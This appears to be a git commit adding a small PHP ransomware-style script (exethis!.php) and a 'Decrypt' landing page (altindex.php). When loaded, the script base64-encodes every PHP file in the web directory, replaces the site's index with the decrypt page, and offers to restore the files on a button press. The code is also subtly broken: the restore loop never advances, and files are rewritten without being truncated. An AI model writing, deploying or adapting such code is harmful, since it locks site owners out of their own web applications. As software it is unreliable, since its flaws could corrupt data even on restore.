5ae8bb860ab41ed1907239dff5434e19e2b62ace
Antibiotics <abx@abx.pe.kr>
2021-04-04 13:20:39 +0900

    0.0.1

---
+++ altindex.php
@@ -0,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset = "UTF-8">
+	<title>  </title>
+</head>
+<body>
+	<div id = "container">
+		<form action = "./exethis!.php" method = "POST">
+			<button type = "submit" name = "decrypt" value = "RUN"><b>Decrypt</b></button>
+		</form>
+		<?php #require_once "./exethis!.php"; ?>
+	</div>
+</body>
+</html>
---
+++ exethis!.php
@@ -0,0 +1,80 @@
+<?php
+function getDirContents($dir, &$results = array()) {
+	$files = scandir($dir);
+	foreach ($files as $key => $value) {
+		$path = realpath($dir.DIRECTORY_SEPARATOR.$value);
+		if (!is_dir($path)) {
+			$results[] = $path;
+		} else if ($value != "." && $value != "..") {
+			getDirContents($path, $results);
+			$results[] = $path;
+		}
+	}
+	return $results;
+}
+
+function encweb() {
+	$dirlist = array();
+	$dirlist = getDirContents('./');
+	$i = 0;
+	while (isset($dirlist[$i])) {
+		$cfile = explode('.', $dirlist[$i]);
+		$cfile = array_reverse($cfile);
+		$excfile = explode('/', $cfile[1]);
+		$excfile = array_reverse($excfile);
+		echo $excfile[0]."<br>";
+		
+		if ((string)$excfile[0] != 'index' and (string)$excfile[0] != 'exethis!' and (string)$excfile[0] != 'altindex') {
+			if ((string)$cfile[0] == 'php') { 
+				$encryptfile = file_get_contents($dirlist[$i]);
+				$encrypted = base64_encode($encryptfile);
+				$fp = fopen($dirlist[$i], 'r+');
+				fwrite($fp, $encrypted);
+				fclose($fp);
+			}
+		}
+		$i++;
+	}
+	rename('./index.php', './old_index.php');
+	rename('./altindex.php', './index.php');
+	file_put_contents("./alreadyexecuted", "1");
+	if (file_exists("./alreadyexecuted")) {
+		echo "
+			<script type = 'text/javascript'>
+				alert('success');
+			</script>
+			";
+	}
+}
+
+function decweb() {
+	unlink('./index.php');
+	rename('./old_index.php', './index.php');
+	$dirlist = array();
+	$dirlist = getDirContents('./');
+	$i = 0;
+	while (isset($dirlist[$i])) {
+		$cfile = explode('.', $dirlist[$i]);
+		$cfile = array_reverse($cfile);
+		if ((string)$cfile[0] == 'php') { 
+			$decryptfile = file_get_contents($dirlist[$i]);
+			#$decryptfile = strtr($decryptfile, array('-' => '+', '_' => '/'));
+			$decrypted = base64_decode($decryptfile);
+			$fp = fopen($dirlist[$i], 'r+');
+			fwrite($fp, $decrypted);
+			fclose($fp);
+		}
+	}
+	unlink('./exethis!.php');
+}
+
+if (array_key_exists('decrypt', $_POST)) {
+	decweb();
+} else {
+	if (!file_exists('./alreadyexecuted')) {
+		encweb();
+	} else {
+		header('Location: ./index.php');
+	}
+}
+?>
